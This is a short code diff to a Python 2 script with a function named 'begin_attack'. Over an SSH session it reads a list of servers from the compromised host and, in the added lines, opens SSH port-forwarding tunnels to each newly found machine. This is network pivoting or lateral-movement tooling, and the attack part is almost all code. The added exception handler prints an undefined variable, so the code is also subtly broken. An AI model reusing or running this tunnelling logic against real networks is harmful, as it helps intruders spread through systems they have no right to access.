@@ -110,8 +110,8 @@ def begin_attack(client):
         # at this point we are connected via SSH
         # gets the servers.txt
         stdin, stdout, stderr = client.exec_command("cat ~/servers.txt")
-        new_servers = stdout.readlines().split("\n")
-        print new_servers
+        new_servers = stdout.readlines()
+        new_servers = map(lambda x: x.strip(), new_servers)
         for s in new_servers:
             host, port = get_host_port(s)
             # if we have not seen this ip_address before
@@ -121,8 +121,14 @@ def begin_attack(client):
                 ip_list.append(host)
                 q.put(compObj)
 
+                # set up forwarder to the new computer
+                try:
+                    forward_tunnel(server.ssh_port, compObj.host, compObj.ssh_port, client.get_transport())
+                    verbose('Now forwarding %s:%d to %s:%d ...' % (server.host, server.ssh_port, compObj.host, compObj.ssh_port))
+                except Exception:
+                    print e
 
-    # verbose('Now forwarding port %d to %s:%d ...' % (options.port, remote[0], remote[1]))
+
 
     # try:
     #     forward_tunnel(options.port, remote[0], remote[1], client.get_transport())
